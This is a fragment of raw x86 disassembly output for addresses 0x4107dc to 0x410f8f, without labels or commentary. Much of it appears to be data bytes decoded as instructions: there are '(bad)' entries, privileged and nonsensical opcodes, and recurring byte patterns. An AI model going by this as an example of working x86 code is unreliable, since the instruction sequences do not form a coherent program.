  4107dc:	sets   BYTE PTR [eax+0x682eea73]
  4107e3:	inc    esp
  4107e4:	arpl   WORD PTR [eax+0x25406223],ax
  4107ea:	add    BYTE PTR [esi+0x40],ah
  4107ed:	add    eax,0x40404143
  4107f2:	inc    ebx
  4107f3:	add    BYTE PTR [eax],al
  4107f5:	add    BYTE PTR [edx-0x34],ah
  4107f8:	inc    eax
  4107f9:	add    eax,0x40004041
  4107fe:	inc    ecx
  4107ff:	int3   
  410800:	add    BYTE PTR [ebx-0x7c],al
  410803:	add    eax,0x5406240
  410808:	(bad)  
  410809:	not    DWORD PTR [ecx+0x6c]
  41080c:	xor    DWORD PTR [esp+edi*4],ebp
  41080f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410810:	dec    edx
  410811:	dec    ecx
  410812:	inc    eax
  410813:	inc    ecx
  410814:	shl    BYTE PTR [esi-0x4797579e],1
  41081a:	cmp    DWORD PTR [ebx+eax*2-0x2b],edx
  41081e:	rcl    DWORD PTR [edx],1
  410820:	fisubr DWORD PTR [eax+0x40]
  410823:	inc    eax
  410824:	test   al,0x57
  410826:	mov    esp,0x214028a4
  41082b:	add    dl,BYTE PTR [eax]
  41082d:	out    0x44,al
  41082f:	inc    edx
  410830:	imul   eax,DWORD PTR [eax+0x62],0x40054158
  410837:	inc    ebx
  410838:	inc    eax
  410839:	inc    eax
  41083a:	inc    ebx
  41083b:	inc    eax
  41083c:	test   BYTE PTR [eax],al
  41083e:	add    eax,0x40624041
  410843:	inc    eax
  410844:	add    BYTE PTR [edx+0x5],ah
  410847:	inc    ebx
  410848:	add    BYTE PTR [eax+0x78],al
  41084b:	inc    ecx
  41084c:	add    BYTE PTR [eax+0x41],bl
  41084f:	bound  esp,QWORD PTR [eax+0x73]
  410852:	inc    eax
  410853:	lods   al,BYTE PTR ds:[esi]
  410854:	inc    esp
  410855:	adc    DWORD PTR [esi],ecx
  410857:	xor    eax,0x42604345
  41085c:	sub    al,0x67
  41085e:	lock dec esp
  410860:	cmp    eax,0xb4b4582f
  410865:	mov    ah,0x40
  410867:	dec    esp
  410868:	inc    ebp
  410869:	inc    ecx
  41086a:	or     al,0xf8
  41086c:	outs   dx,DWORD PTR ds:[esi]
  41086d:	inc    esp
  41086e:	mov    ds:0x40093f3d,eax
  410873:	inc    edx
  410874:	inc    eax
  410875:	test   BYTE PTR [eax],al
  410877:	int3   
  410878:	bound  eax,QWORD PTR ds:0xcc840f41
  41087e:	inc    ebx
  41087f:	add    BYTE PTR [eax+0x0],al
  410882:	inc    eax
  410883:	inc    eax
  410884:	inc    eax
  410885:	int3   
  410886:	add    BYTE PTR ds:0x62404341,al
  41088c:	pop    eax
  41088d:	add    BYTE PTR [ebx+0x40],al
  410890:	bound  ecx,QWORD PTR [edi]
  410892:	inc    eax
  410893:	popf   
  410894:	adc    DWORD PTR [ecx+0x294245c3],edx
  41089a:	sub    BYTE PTR [edi+ebp*2+0x62],al
  41089e:	outs   dx,DWORD PTR ds:[esi]
  41089f:	aas    
  4108a0:	cs add al,0xbc
  4108a3:	sub    al,0xe8
  4108a5:	add    eax,0x40ce004b
  4108aa:	or     eax,0x4687d4b2
  4108af:	mov    edi,0xc5cb60db
  4108b4:	xchg   esp,eax
  4108b5:	or     eax,0x3c45cf80
  4108ba:	add    al,0x6c
  4108bc:	inc    esp
  4108bd:	xchg   esi,eax
  4108be:	jmp    0x410910
  4108c0:	add    DWORD PTR [eax+0x3f],eax
  4108c3:	(bad)  
  4108c4:	adc    DWORD PTR [eax+ebp*4+0x2341ff],eax
  4108cb:	add    BYTE PTR [eax+0x40],al
  4108ce:	cmovno eax,DWORD PTR ds:0x40056243
  4108d5:	int3   
  4108d6:	add    ah,cl
  4108d8:	inc    eax
  4108d9:	inc    eax
  4108da:	bound  eax,QWORD PTR [ecx+0x0]
  4108dd:	add    BYTE PTR [edi],cl
  4108df:	inc    ebx
  4108e0:	inc    eax
  4108e1:	inc    eax
  4108e2:	add    BYTE PTR [ecx+0x43],al
  4108e5:	add    eax,0x40256240
  4108ea:	bound  eax,QWORD PTR [eax]
  4108ec:	bound  eax,QWORD PTR [eax+ebp*2+0xd]
  4108f0:	adc    cl,BYTE PTR [edx]
  4108f2:	outs   dx,DWORD PTR ds:[esi]
  4108f3:	inc    eax
  4108f4:	inc    eax
  4108f5:	sub    al,0xbc
  4108f7:	leave  
  4108f8:	xor    bh,dh
  4108fa:	inc    ebx
  4108fb:	sub    DWORD PTR [edx-0x2c63f250],esp
  410901:	or     bl,BYTE PTR [ecx]
  410903:	call   0x41bcde89
  410908:	push   edx
  410909:	inc    DWORD PTR [edx+0x40]
  41090c:	fs pop ebx
  41090e:	mov    ah,0xe
  410910:	sub    BYTE PTR [eax],al
  410912:	and    eax,0xdf62733
  410917:	lock add eax,0x4140cc00
  41091d:	inc    eax
  41091e:	inc    ebx
  41091f:	bound  esp,QWORD PTR ds:0x41400043
  410925:	add    BYTE PTR [eax],al
  410927:	add    eax,0x43624062
  41092c:	inc    ecx
  41092d:	inc    eax
  41092e:	inc    eax
  41092f:	inc    eax
  410930:	add    eax,0x40624340
  410935:	add    eax,0x40664140
  41093a:	int    0x5f
  41093c:	dec    edi
  41093d:	inc    eax
  41093e:	arpl   WORD PTR [ebx+ecx*8-0x78],ax
  410942:	push   ebx
  410943:	rol    DWORD PTR [eax+0x60],1
  410946:	push   eax
  410947:	sub    al,0x43
  410949:	add    eax,0x7c305340
  41094e:	dec    esp
  41094f:	scas   al,BYTE PTR es:[edi]
  410950:	jne    0x4108d9
  410952:	imul   BYTE PTR [edx+0x71]
  410955:	inc    edx
  410956:	leave  
  410957:	int    0xa8
  410959:	inc    eax
  41095a:	ins    BYTE PTR es:[edi],dx
  41095b:	adc    eax,DWORD PTR [eax+0x24]
  41095e:	es pop ebx
  410960:	push   ebp
  410961:	inc    ecx
  410962:	imul   DWORD PTR [esi-0x4b]
  410965:	call   0x2093ffbc
  41096a:	test   al,0xd3
  41096c:	and    eax,0x30440e42
  410971:	cmp    ch,bh
  410973:	enter  0x3771,0x43
  410977:	add    BYTE PTR ds:0x41107840,al
  41097d:	bound  eax,QWORD PTR [eax+0x40]
  410980:	sldt   WORD PTR [eax-0x34]
  410984:	js     0x4109e8
  410986:	add    eax,0x40664143
  41098b:	inc    ebx
  41098c:	add    BYTE PTR [ecx+0x5],al
  41098f:	js     0x4109d1
  410991:	bound  eax,QWORD PTR [eax+0x0]
  410994:	inc    eax
  410995:	or     al,0x2c
  410997:	out    dx,eax
  410998:	jle    0x4109da
  41099a:	xchg   ecx,eax
  41099b:	inc    eax
  41099c:	dec    edx
  41099d:	retf   
  41099e:	lods   al,BYTE PTR ds:[esi]
  41099f:	pushf  
  4109a0:	clc    
  4109a1:	loop   0x410962
  4109a3:	xor    eax,DWORD PTR [eax+0x26]
  4109a6:	inc    eax
  4109a7:	sti    
  4109a8:	cld    
  4109a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109aa:	adc    BYTE PTR [edx+0x60],dl
  4109ad:	mov    eax,0x284b4ccd
  4109b2:	push   ebp
  4109b3:	inc    eax
  4109b4:	inc    eax
  4109b5:	xor    eax,0x6bd16269
  4109ba:	outs   dx,BYTE PTR ds:[esi]
  4109bb:	and    DWORD PTR [ebx+ecx*8-0x56],ebp
  4109bf:	(bad)  
  4109c0:	iret   
  4109c1:	xor    eax,0xb0405a53
  4109c6:	aad    0x4f
  4109c8:	dec    ecx
  4109c9:	dec    ebx
  4109ca:	outs   dx,BYTE PTR ds:[esi]
  4109cb:	inc    eax
  4109cc:	cs or  eax,0x43414441
  4109d2:	inc    eax
  4109d3:	inc    eax
  4109d4:	add    eax,0x434162
  4109d9:	inc    eax
  4109da:	add    BYTE PTR [edx+0x5],ah
  4109dd:	inc    eax
  4109de:	adc    BYTE PTR [edx+0x40],ah
  4109e1:	inc    ebx
  4109e2:	inc    ecx
  4109e3:	add    eax,0x4340
  4109e8:	add    eax,0x404162
  4109ed:	add    BYTE PTR [eax+0x43],al
  4109f0:	inc    eax
  4109f1:	add    eax,0x21354c91
  4109f6:	push   0x6c02eecb
  4109fb:	cmp    eax,0xac4066c9
  410a00:	dec    eax
  410a01:	push   0x50
  410a03:	ret    
  410a04:	xchg   ebp,eax
  410a05:	inc    ecx
  410a06:	sub    eax,0x208c3005
  410a0b:	and    BYTE PTR [ecx+0x15],dh
  410a0e:	inc    edx
  410a0f:	retf   
  410a10:	test   al,0x3a
  410a12:	outs   dx,DWORD PTR ds:[esi]
  410a13:	stos   DWORD PTR es:[edi],eax
  410a14:	jne    0x410a54
  410a16:	inc    eax
  410a17:	dec    edi
  410a18:	int    0x62
  410a1a:	push   cs
  410a1b:	dec    esp
  410a1c:	inc    esp
  410a1d:	dec    eax
  410a1e:	sub    BYTE PTR [ecx+0x4b],al
  410a21:	ret    0x5ff1
  410a24:	mov    ecx,0xe6344024
  410a29:	inc    eax
  410a2a:	add    BYTE PTR [eax],al
  410a2c:	inc    ecx
  410a2d:	inc    ebx
  410a2e:	add    eax,0x41784062
  410a33:	inc    eax
  410a34:	inc    eax
  410a35:	add    BYTE PTR [edi],cl
  410a37:	bound  eax,QWORD PTR [ebx+0x0]
  410a3a:	add    eax,0x25006240
  410a3f:	inc    eax
  410a40:	add    eax,0x40254143
  410a45:	add    eax,0xbc620000
  410a4a:	pushf  
  410a4b:	enter  0x3226,0x25
  410a4f:	push   esi
  410a50:	dec    esp
  410a51:	adc    eax,0x42711405
  410a56:	xor    BYTE PTR [esp+esi*1],cl
  410a59:	and    al,0xcd
  410a5b:	pushf  
  410a5c:	pop    eax
  410a5d:	xor    BYTE PTR [eax+0x34],al
  410a60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a61:	and    ah,BYTE PTR [edx-0x58]
  410a64:	adc    al,BYTE PTR [eax+0x32]
  410a67:	loop   0x410a2e
  410a69:	dec    ecx
  410a6a:	xor    edx,DWORD PTR [eax]
  410a6c:	mov    edi,0x4f7e4060
  410a71:	lock pusha 
  410a73:	test   al,0x26
  410a75:	jbe    0x410a9c
  410a77:	neg    BYTE PTR fs:[eax+eiz*8+0x5]
  410a7c:	arpl   WORD PTR [eax+0x48],ax
  410a7f:	leave  
  410a80:	inc    ebx
  410a81:	add    BYTE PTR [eax],al
  410a83:	add    BYTE PTR [ecx+0x40],al
  410a86:	bound  esp,QWORD PTR [esi+0x0]
  410a89:	inc    eax
  410a8a:	add    eax,0x5400000
  410a8f:	inc    ecx
  410a90:	inc    eax
  410a91:	inc    eax
  410a92:	bound  esp,QWORD PTR ds:0x25050043
  410a98:	inc    ecx
  410a99:	inc    ebx
  410a9a:	inc    eax
  410a9b:	test   BYTE PTR [eax+0x0],al
  410a9e:	bound  ebx,QWORD PTR [eax+0x62]
  410aa1:	inc    ecx
  410aa2:	inc    eax
  410aa3:	dec    esp
  410aa4:	inc    esp
  410aa5:	fs inc ebx
  410aa7:	(bad)  
  410aa8:	xor    eax,0x1347040
  410aad:	push   ebx
  410aae:	js     0x410abc
  410ab0:	loop   0x410ae6
  410ab2:	in     eax,0xa4
  410ab4:	ins    DWORD PTR es:[di],dx
  410ab6:	cmp    al,0xc
  410ab8:	inc    eax
  410ab9:	inc    eax
  410aba:	or     DWORD PTR [eax+0x13],edi
  410abd:	add    DWORD PTR [ebx-0x43],0x62102e31
  410ac4:	inc    eax
  410ac5:	inc    ecx
  410ac6:	and    eax,0x40000500
  410acb:	inc    ebx
  410acc:	add    eax,0x40624041
  410ad1:	inc    ebx
  410ad2:	add    eax,0x43402541
  410ad7:	bound  eax,QWORD PTR [eax+0x43]
  410ada:	int3   
  410adb:	inc    eax
  410adc:	bound  eax,QWORD PTR [eax]
  410ade:	inc    ecx
  410adf:	inc    eax
  410ae0:	inc    eax
  410ae1:	add    eax,0x58bda805
  410ae6:	arpl   WORD PTR [eax+0x42405604],bp
  410aec:	or     al,0x51
  410aee:	es ins DWORD PTR es:[edi],dx
  410af0:	xchg   ebx,eax
  410af1:	inc    edx
  410af2:	xor    eax,0xdcdedccf
  410af7:	mov    ch,0x3a
  410af9:	sub    eax,0x44625340
  410afe:	inc    eax
  410aff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b00:	adc    ebx,DWORD PTR [edx+0x60]
  410b03:	lds    ax,DWORD PTR [edx+ebp*1]
  410b07:	test   al,0x62
  410b09:	inc    eax
  410b0a:	and    eax,0x5406600
  410b0f:	inc    ebx
  410b10:	inc    ecx
  410b11:	inc    eax
  410b12:	inc    eax
  410b13:	inc    ebx
  410b14:	add    BYTE PTR [eax],al
  410b16:	add    BYTE PTR [edx-0x34],ah
  410b19:	inc    eax
  410b1a:	add    eax,0x40004041
  410b1f:	inc    ecx
  410b20:	int3   
  410b21:	add    BYTE PTR [ebx-0x7c],al
  410b24:	add    eax,0x5406240
  410b29:	bound  edx,QWORD PTR [eax]
  410b2b:	inc    eax
  410b2c:	inc    eax
  410b2d:	es dec edi
  410b2f:	imul   eax,esi,0xf529130f
  410b35:	xor    al,0x45
  410b37:	push   eax
  410b38:	xchg   BYTE PTR [esp+edi*2-0x3840a1c0],dh
  410b3f:	mov    al,0x62
  410b41:	xor    ebx,DWORD PTR [ebx-0xc4fbfd3]
  410b47:	inc    ecx
  410b48:	imul   edi,DWORD PTR [eax],0x41586240
  410b4e:	add    eax,0x40404340
  410b53:	inc    ebx
  410b54:	inc    eax
  410b55:	test   BYTE PTR [eax],al
  410b57:	add    eax,0x40624041
  410b5c:	inc    eax
  410b5d:	add    BYTE PTR [edx+0x5],ah
  410b60:	inc    ebx
  410b61:	add    BYTE PTR [eax+0x78],al
  410b64:	inc    ecx
  410b65:	add    BYTE PTR [eax+0x41],bl
  410b68:	bound  ebx,QWORD PTR [edi]
  410b6a:	push   0x948d4140
  410b6f:	fsubr  QWORD PTR [eax]
  410b71:	pop    es
  410b72:	inc    eax
  410b73:	xor    esp,DWORD PTR [eax+edi*2-0x4c]
  410b77:	cdq    
  410b78:	push   0x70336015
  410b7d:	cmp    eax,0x7353fcf
  410b82:	jb     0x410b39
  410b84:	push   edx
  410b85:	push   edi
  410b86:	test   ecx,ecx
  410b88:	dec    edx
  410b89:	pop    ds
  410b8a:	inc    edx
  410b8b:	addr16 inc ebx
  410b8d:	cmp    al,0x52
  410b8f:	bound  ecx,QWORD PTR [eax+0x4a]
  410b92:	pusha  
  410b93:	xchg   ebx,eax
  410b94:	enter  0x89c7,0x34
  410b98:	inc    esi
  410b99:	repz push edx
  410b9b:	inc    ebp
  410b9c:	sub    al,0xd0
  410b9e:	stos   DWORD PTR es:[edi],eax
  410b9f:	sub    ah,0x40
  410ba2:	test   BYTE PTR [eax],al
  410ba4:	int3   
  410ba5:	bound  eax,QWORD PTR ds:0xcc840f41
  410bab:	inc    ebx
  410bac:	add    BYTE PTR [eax+0x0],al
  410baf:	inc    eax
  410bb0:	inc    eax
  410bb1:	inc    eax
  410bb2:	int3   
  410bb3:	add    BYTE PTR ds:0x62404341,al
  410bb9:	pop    eax
  410bba:	add    BYTE PTR [ebx+0x40],al
  410bbd:	bound  ecx,QWORD PTR [edi]
  410bbf:	inc    eax
  410bc0:	jnp    0x410c03
  410bc2:	repnz dec edx
  410bc4:	pop    ebx
  410bc5:	and    ebp,eax
  410bc7:	into   
  410bc8:	mul    DWORD PTR [edx+ebx*1]
  410bcb:	and    eax,0x4641d2d4
  410bd0:	pop    esi
  410bd1:	inc    edx
  410bd2:	pop    ecx
  410bd3:	inc    ebx
  410bd4:	inc    esp
  410bd5:	gs dec esi
  410bd7:	lea    esi,[edx+0x202cf334]
  410bdd:	mov    esp,0x5c744ddc
  410be2:	outs   dx,BYTE PTR ds:[esi]
  410be3:	sbb    BYTE PTR [edx+0x6aa84141],ah
  410be9:	inc    eax
  410bea:	not    DWORD PTR [ebp-0x33]
  410bed:	mov    ebp,0x6d9311a9
  410bf2:	add    BYTE PTR [eax],al
  410bf4:	inc    eax
  410bf5:	inc    eax
  410bf6:	cmovno eax,DWORD PTR ds:0x40056243
  410bfd:	int3   
  410bfe:	add    ah,cl
  410c00:	inc    eax
  410c01:	inc    eax
  410c02:	bound  eax,QWORD PTR [ecx+0x0]
  410c05:	add    BYTE PTR [edi],cl
  410c07:	inc    ebx
  410c08:	inc    eax
  410c09:	inc    eax
  410c0a:	add    BYTE PTR [ecx+0x43],al
  410c0d:	add    eax,0x40256240
  410c12:	bound  eax,QWORD PTR [eax]
  410c14:	pop    ecx
  410c15:	retf   
  410c16:	leave  
  410c17:	imul   ebp,DWORD PTR [edx+eax*8+0x6d],0x25
  410c1c:	rcl    DWORD PTR [ebx+0x26],1
  410c1f:	dec    eax
  410c20:	mov    dh,0x2b
  410c22:	mov    bl,0xc4
  410c24:	aaa    
  410c25:	xor    eax,0x5263ec89
  410c2a:	mov    ebx,0x42467247
  410c2f:	sub    DWORD PTR [ebp-0x6c],ebp
  410c32:	imul   ebp,DWORD PTR [ebp+eax*1+0x0],0xffffffcc
  410c37:	inc    eax
  410c38:	inc    ecx
  410c39:	inc    eax
  410c3a:	inc    ebx
  410c3b:	bound  esp,QWORD PTR ds:0x41400043
  410c41:	add    BYTE PTR [eax],al
  410c43:	add    eax,0x43624062
  410c48:	inc    ecx
  410c49:	inc    eax
  410c4a:	inc    eax
  410c4b:	inc    eax
  410c4c:	add    eax,0x40624340
  410c51:	add    eax,0x40664140
  410c56:	sbb    ecx,DWORD PTR [eax+0x5b]
  410c59:	dec    edi
  410c5a:	fadd   QWORD PTR [eax+0x1f]
  410c5d:	inc    edx
  410c5e:	cmp    BYTE PTR ds:0x8073bd34,bh
  410c64:	push   edi
  410c65:	ss mov edi,0xc466a0c3
  410c6b:	ins    BYTE PTR es:[edi],dx
  410c6c:	mov    cl,0x4c
  410c6e:	or     bl,BYTE PTR [ecx-0x3b]
  410c71:	inc    ecx
  410c72:	scas   eax,DWORD PTR es:[edi]
  410c73:	pop    ecx
  410c74:	fs inc eax
  410c76:	jne    0x410c23
  410c78:	jecxz  0x410c37
  410c7a:	inc    ebx
  410c7b:	add    BYTE PTR ds:0x41107840,al
  410c81:	bound  eax,QWORD PTR [eax+0x40]
  410c84:	sldt   WORD PTR [eax-0x34]
  410c88:	js     0x410cec
  410c8a:	add    eax,0x40664143
  410c8f:	inc    ebx
  410c90:	add    BYTE PTR [ecx+0x5],al
  410c93:	js     0x410cd5
  410c95:	bound  eax,QWORD PTR [eax+0x0]
  410c98:	inc    eax
  410c99:	test   eax,0x262f55a8
  410c9e:	mov    esp,0x60ac7096
  410ca3:	fs je  0x410c9d
  410ca6:	or     eax,0xac58f10b
  410cab:	pop    edi
  410cac:	inc    eax
  410cad:	and    cl,BYTE PTR [edx+0x34]
  410cb0:	dec    esp
  410cb1:	mov    edi,0xbb32466c
  410cb6:	inc    ebx
  410cb7:	bound  edx,QWORD PTR [esi+0x6d]
  410cba:	jp     0x410d0d
  410cbc:	sub    dh,BYTE PTR [ebx]
  410cbe:	enter  0x41d5,0x31
  410cc2:	sub    BYTE PTR [edi+0x41],ch
  410cc5:	inc    ebx
  410cc6:	inc    eax
  410cc7:	inc    eax
  410cc8:	add    eax,0x434162
  410ccd:	inc    eax
  410cce:	add    BYTE PTR [edx+0x5],ah
  410cd1:	inc    eax
  410cd2:	adc    BYTE PTR [edx+0x40],ah
  410cd5:	inc    ebx
  410cd6:	inc    ecx
  410cd7:	add    eax,0x4340
  410cdc:	add    eax,0x404162
  410ce1:	add    BYTE PTR [eax+0x43],al
  410ce4:	inc    eax
  410ce5:	add    eax,0x4e281148
  410cea:	mov    esp,0x40336edc
  410cef:	sub    cl,BYTE PTR [ebp-0x3]
  410cf2:	ins    BYTE PTR es:[edi],dx
  410cf3:	ja     0x410d2a
  410cf5:	inc    edi
  410cf6:	and    eax,0x2b44cb33
  410cfb:	mov    WORD PTR [ecx+0x52],cs
  410cfe:	sub    BYTE PTR [ebp+0x26],dl
  410d01:	sub    al,0xa8
  410d03:	sbb    al,0x47
  410d05:	and    al,BYTE PTR [eax-0x2b]
  410d08:	mov    al,0x9c
  410d0a:	adc    al,BYTE PTR ds:0xbf4abe46
  410d10:	add    eax,0xe0dd5513
  410d15:	dec    esp
  410d16:	inc    eax
  410d17:	imul   eax,DWORD PTR [eax+0x0],0x0
  410d1b:	inc    ecx
  410d1c:	inc    ebx
  410d1d:	add    eax,0x41784062
  410d22:	inc    eax
  410d23:	inc    eax
  410d24:	add    BYTE PTR [edi],cl
  410d26:	bound  eax,QWORD PTR [ebx+0x0]
  410d29:	add    eax,0x25006240
  410d2e:	inc    eax
  410d2f:	add    eax,0x40254143
  410d34:	add    eax,0x43620000
  410d39:	test   DWORD PTR [ecx-0x18],eax
  410d3c:	xor    BYTE PTR [ebx+0x4443924d],0x4f
  410d43:	mov    al,ds:0x14282846
  410d48:	sub    BYTE PTR [esp+edi*1],ch
  410d4b:	test   al,0x81
  410d4d:	xchg   ebx,eax
  410d4e:	inc    eax
  410d4f:	inc    eax
  410d50:	adc    al,0x9a
  410d52:	jno    0x410d97
  410d54:	add    DWORD PTR [ebx+0x6c],ebx
  410d57:	push   esp
  410d58:	loope  0x410d9a
  410d5a:	je     0x410d7d
  410d5c:	test   al,0x95
  410d5e:	loop   0x410d68
  410d60:	push   ebp
  410d61:	int    0x62
  410d63:	push   0x9f404712
  410d68:	xor    eax,0x94104769
  410d6d:	xor    esi,DWORD PTR [ebx]
  410d6f:	or     BYTE PTR [ebp-0x68],al
  410d72:	in     al,dx
  410d73:	inc    edx
  410d74:	inc    ebx
  410d75:	add    BYTE PTR [eax],al
  410d77:	add    BYTE PTR [ecx+0x40],al
  410d7a:	bound  esp,QWORD PTR [esi+0x0]
  410d7d:	inc    eax
  410d7e:	add    eax,0x5400000
  410d83:	inc    ecx
  410d84:	inc    eax
  410d85:	inc    eax
  410d86:	bound  esp,QWORD PTR ds:0x25050043
  410d8c:	inc    ecx
  410d8d:	inc    ebx
  410d8e:	inc    eax
  410d8f:	test   BYTE PTR [eax+0x0],al
  410d92:	bound  ebx,QWORD PTR [eax+0x62]
  410d95:	inc    ecx
  410d96:	inc    eax
  410d97:	inc    ecx
  410d98:	rol    BYTE PTR [eax-0x61],0x48
  410d9c:	aad    0xed
  410d9e:	ds push edx
  410da0:	xor    DWORD PTR [edi],ebp
  410da2:	or     BYTE PTR ds:0xd4f0416f,bh
  410da8:	push   ax
  410daa:	lahf   
  410dab:	ret    
  410dac:	fidivr DWORD PTR [ebp+0x40d140a8]
  410db2:	or     BYTE PTR [esp+eiz*2+0x68],dh
  410db6:	adc    DWORD PTR [eax-0x5460d400],eax
  410dbc:	inc    esp
  410dbd:	addr16 pop eax
  410dbf:	outs   dx,BYTE PTR ds:[esi]
  410dc0:	rol    DWORD PTR [eax+0x48],cl
  410dc3:	mov    esp,0xa08dc2c
  410dc8:	inc    edi
  410dc9:	and    eax,0x996155f
  410dce:	adc    BYTE PTR [edx+0x40],ah
  410dd1:	inc    ecx
  410dd2:	and    eax,0x40000500
  410dd7:	inc    ebx
  410dd8:	add    eax,0x40624041
  410ddd:	inc    ebx
  410dde:	add    eax,0x43402541
  410de3:	bound  eax,QWORD PTR [eax+0x43]
  410de6:	int3   
  410de7:	inc    eax
  410de8:	bound  eax,QWORD PTR [eax]
  410dea:	inc    ecx
  410deb:	inc    eax
  410dec:	inc    eax
  410ded:	add    eax,0xf9a8cb05
  410df2:	dec    eax
  410df3:	dec    DWORD PTR [ecx-0x33]
  410df6:	je     0x410e38
  410df8:	mov    al,ds:0x434840bf
  410dfd:	dec    ebx
  410dfe:	bound  eax,QWORD PTR [eax+0x29]
  410e01:	pop    esi
  410e02:	pusha  
  410e03:	(bad)  
  410e05:	(bad)  
  410e06:	sub    BYTE PTR [eax+eiz*8],ch
  410e09:	adc    eax,DWORD PTR [eax+0x8]
  410e0c:	and    al,0x44
  410e0e:	sub    BYTE PTR [ecx],cl
  410e10:	loope  0x410e59
  410e12:	cs lahf 
  410e14:	push   ebp
  410e15:	sub    al,0x40
  410e17:	test   al,0x28
  410e19:	xor    DWORD PTR [eax+0x2e],eax
  410e1c:	retf   
  410e1d:	xchg   esp,eax
  410e1e:	bound  eax,QWORD PTR [eax+0x25]
  410e21:	add    BYTE PTR [esi+0x40],ah
  410e24:	add    eax,0x40404143
  410e29:	inc    ebx
  410e2a:	add    BYTE PTR [eax],al
  410e2c:	add    BYTE PTR [edx-0x34],ah
  410e2f:	inc    eax
  410e30:	add    eax,0x40004041
  410e35:	inc    ecx
  410e36:	int3   
  410e37:	add    BYTE PTR [ebx-0x7c],al
  410e3a:	add    eax,0x5406240
  410e3f:	bound  eax,QWORD PTR [ecx+0x40]
  410e42:	imul   ebx,DWORD PTR [edi+ebp*1],0x2f
  410e46:	lds    eax,FWORD PTR es:[esi+0x4033352a]
  410e4d:	push   ecx
  410e4e:	mov    al,0x35
  410e50:	mov    ah,0x10
  410e52:	dec    eax
  410e53:	sti    
  410e54:	and    ecx,DWORD PTR [ebp+ecx*1-0x16]
  410e58:	or     eax,0x4013479c
  410e5d:	mov    ch,0x43
  410e5f:	inc    esp
  410e60:	inc    ebx
  410e61:	add    eax,0x6df6f05f
  410e66:	inc    ebx
  410e67:	sub    al,0xb8
  410e69:	retf   
  410e6a:	enter  0x6995,0x71
  410e6e:	sub    BYTE PTR [edx+0x4440920d],dl
  410e74:	in     eax,dx
  410e75:	inc    eax
  410e76:	bound  ebx,QWORD PTR [eax+0x41]
  410e79:	add    eax,0x40404340
  410e7e:	inc    ebx
  410e7f:	inc    eax
  410e80:	test   BYTE PTR [eax],al
  410e82:	add    eax,0x40624041
  410e87:	inc    eax
  410e88:	add    BYTE PTR [edx+0x5],ah
  410e8b:	inc    ebx
  410e8c:	add    BYTE PTR [eax+0x78],al
  410e8f:	inc    ecx
  410e90:	add    BYTE PTR [eax+0x41],bl
  410e93:	(bad)  
  410e94:	not    DWORD PTR [eax]
  410e96:	aad    0xcb
  410e98:	mov    edi,0x13b3f1b3
  410e9d:	dec    ebp
  410e9e:	outs   dx,BYTE PTR ds:[esi]
  410e9f:	mov    edx,DWORD PTR [eax+0x46]
  410ea2:	sbb    DWORD PTR [ebp-0x541134c5],ebp
  410ea8:	inc    edx
  410ea9:	adc    BYTE PTR ds:0x44567713,0x50
  410eb0:	inc    eax
  410eb1:	xor    al,BYTE PTR [ecx+0x43]
  410eb4:	lahf   
  410eb5:	xor    eax,0xa841c82c
  410eba:	xor    DWORD PTR [edx+0x9],ecx
  410ebd:	inc    esp
  410ebe:	nop
  410ebf:	inc    eax
  410ec0:	test   BYTE PTR [eax],al
  410ec2:	int3   
  410ec3:	bound  eax,QWORD PTR ds:0xcc840f41
  410ec9:	inc    ebx
  410eca:	add    BYTE PTR [eax+0x0],al
  410ecd:	inc    eax
  410ece:	inc    eax
  410ecf:	inc    eax
  410ed0:	int3   
  410ed1:	add    BYTE PTR ds:0x62404341,al
  410ed7:	pop    eax
  410ed8:	add    BYTE PTR [ebx+0x40],al
  410edb:	bound  ecx,QWORD PTR [edi]
  410edd:	inc    eax
  410ede:	mov    esp,0x11bf1030
  410ee3:	pop    ds
  410ee4:	dec    eax
  410ee5:	int    0x5
  410ee7:	mov    ah,cl
  410ee9:	sbb    eax,0x5d3d091f
  410eee:	inc    ebx
  410eef:	test   al,0x41
  410ef1:	icebp  
  410ef2:	rcr    BYTE PTR [edi],cl
  410ef4:	ret    
  410ef5:	out    0xb8,al
  410ef7:	adc    DWORD PTR [edx+0x46],edx
  410efa:	mov    eax,ds:0x5441041
  410eff:	lods   al,BYTE PTR ds:[esi]
  410f00:	xchg   esp,eax
  410f01:	mov    cl,0x42
  410f03:	jmp    FWORD PTR [ebx+0x4041cb2c]
  410f09:	fcomip st,st(0)
  410f0b:	or     DWORD PTR [esi+ecx*4+0x518c3b21],edi
  410f12:	and    al,0x1f
  410f14:	dec    ecx
  410f15:	push   ecx
  410f16:	add    BYTE PTR [eax],al
  410f18:	inc    eax
  410f19:	inc    eax
  410f1a:	cmovno eax,DWORD PTR ds:0x40056243
  410f21:	int3   
  410f22:	add    ah,cl
  410f24:	inc    eax
  410f25:	inc    eax
  410f26:	bound  eax,QWORD PTR [ecx+0x0]
  410f29:	add    BYTE PTR [edi],cl
  410f2b:	inc    ebx
  410f2c:	inc    eax
  410f2d:	inc    eax
  410f2e:	add    BYTE PTR [ecx+0x43],al
  410f31:	add    eax,0x40256240
  410f36:	bound  eax,QWORD PTR [eax]
  410f38:	sub    BYTE PTR [eax],0x6c
  410f3b:	imul   esi,ebp,0xc3857900
  410f41:	inc    eax
  410f42:	cmp    esi,ecx
  410f44:	push   ebx
  410f45:	jg     0x410f63
  410f47:	inc    esp
  410f48:	mov    ecx,0x5d0ba8cb
  410f4d:	or     DWORD PTR [edx+0x2c],edx
  410f50:	mov    bh,0xbf
  410f52:	pop    ebp
  410f53:	add    eax,0x4140cc00
  410f58:	inc    eax
  410f59:	inc    ebx
  410f5a:	bound  esp,QWORD PTR ds:0x41400043
  410f60:	add    BYTE PTR [eax],al
  410f62:	add    eax,0x43624062
  410f67:	inc    ecx
  410f68:	inc    eax
  410f69:	inc    eax
  410f6a:	inc    eax
  410f6b:	add    eax,0x40624340
  410f70:	add    eax,0x40664140
  410f75:	mov    bl,0x11
  410f77:	pop    ds
  410f78:	add    DWORD PTR [eax+eax*2-0x35bbfa41],ecx
  410f7f:	bound  ecx,QWORD PTR [eax-0x2c7ebfc0]
  410f85:	adc    ecx,edx
  410f87:	xchg   ebx,eax
  410f88:	and    ch,cl
  410f8a:	inc    eax
  410f8b:	xchg   ebp,eax
  410f8c:	loop   0x410f8a
  410f8e:	xchg   edi,eax
  410f8f:	dec    ecx
